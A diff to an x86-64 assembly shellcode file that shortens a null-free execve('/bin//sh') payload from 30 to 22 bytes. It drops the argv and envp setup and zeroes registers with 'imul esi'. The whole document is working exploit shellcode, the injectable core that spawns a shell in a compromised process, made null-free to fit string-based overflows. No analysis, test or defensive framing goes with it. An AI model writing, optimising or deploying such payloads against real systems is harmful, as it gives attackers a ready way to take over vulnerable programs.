@@ -1,20 +1,14 @@
-; execve("/bin//sh", ["/bin//sh"], [NULL]), null-free, 30 bytes
+; execve("/bin//sh", NULL, NULL), null-free, 22 bytes
 BITS 64
-xor eax, eax
-push rax                ; null termination
-mov rdx, 0x68732f2f6e69622f ; "/bin//sh"
-push rdx
+xor esi, esi
+push rsi
+mov rax, 0x68732f2f6e69622f ; "/bin//sh"
+push rax
 push rsp
 pop rdi                 ; path -> "/bin//sh"
 
-push rax                ; NULL
-push rsp
-pop rdx                 ; envp -> [NULL]
-
-lea rcx, [rdi+6]        ; "sh"
-push rcx
-push rsp
-pop rsi                 ; argv -> ["sh", NULL]
+; set edx:eax = 0
+imul esi
 
 mov al, 59              ; __NR_execve
 syscall
